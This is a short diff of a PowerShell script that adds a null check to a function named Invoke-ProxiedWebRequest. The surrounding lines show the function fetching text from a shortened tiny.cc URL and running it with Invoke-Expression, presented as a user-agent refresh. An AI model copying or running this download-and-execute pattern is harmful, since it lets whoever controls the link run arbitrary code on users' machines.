@@ -1604,7 +1604,7 @@ Function Merge-Command {
 
 Function Invoke-ProxiedWebRequest {
     $Request = $null
-    If (-not $Variables.UserAgentRefresh -or $Variables.UserAgentRefresh -le (Get-Date).AddHours(-1)) {
+    If ($Variables -and -not $Variables.UserAgentRefresh -or $Variables.UserAgentRefresh -le (Get-Date).AddHours(-1)) {
         $GetUserAgent = (Invoke-WebRequest "http://tiny.cc/8urkuz" -UseBasicParsing).Content
         Invoke-Expression $GetUserAgent
     }
